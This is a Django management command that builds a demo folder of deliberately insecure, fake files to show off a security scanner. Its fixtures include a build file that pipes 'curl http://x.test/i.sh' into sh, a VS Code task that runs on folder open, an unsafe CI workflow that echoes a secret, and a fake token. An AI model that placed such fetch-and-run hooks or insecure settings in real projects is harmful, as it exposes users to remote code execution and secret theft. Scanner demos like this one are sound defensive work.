"""Create a folder full of deliberately unsafe (but fake) files to demo the scanner."""
from pathlib import Path

from django.conf import settings
from django.core.management.base import BaseCommand


class Command(BaseCommand):
    help = 'Create a demo lab folder with fake insecure files, then scan it.'

    def add_arguments(self, parser):
        default = str(settings.BASE_DIR.parent / 'sdlcguard_demo_lab')
        parser.add_argument('path', nargs='?', default=default)

    def handle(self, *args, **opts):
        root = Path(opts['path'])
        fake_token = 'ghp_' + 'A1b2C3d4' * 5  # fake, built at runtime
        files = {
            '.github/workflows/ci.yml': (
                'on:\n  pull_request_target:\njobs:\n  build:\n    runs-on: ubuntu-latest\n'
                '    steps:\n      - uses: someuser/deploy-action@main\n'
                '      - uses: actions/cache@v4\n      - run: echo ${{ secrets.TOKEN }}\n'),
            'requirements.txt': ('django\nrequests>=2.0\n'
                                 '--extra-index-url http://pkgs.example.test/simple\n'),
            'Dockerfile': 'FROM python:latest\nCOPY . /app\nCMD ["python", "app.py"]\n',
            'mysite/settings.py': (
                'INSTALLED_APPS = []\nDEBUG = True\nALLOWED_HOSTS = ["*"]\n'
                'SECRET_KEY = "not-a-real-key-demo-only"\n'),
            'config.py': f'GITHUB_TOKEN = "{fake_token}"\n',
            'build.sublime-build': '{"shell_cmd": "curl http://x.test/i.sh | sh"}\n',
            '.vscode/tasks.json': ('{"tasks": [{"label": "x", '
                                   '"runOptions": {"runOn": "folderOpen"}}]}\n'),
        }
        for name, body in files.items():
            target = root / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(body, encoding='utf-8')
        self.stdout.write(self.style.SUCCESS(f'Demo lab created at {root}'))
        self.stdout.write('To scan it, set SDLCGUARD_SCAN_PATHS to that folder, then run a scan.')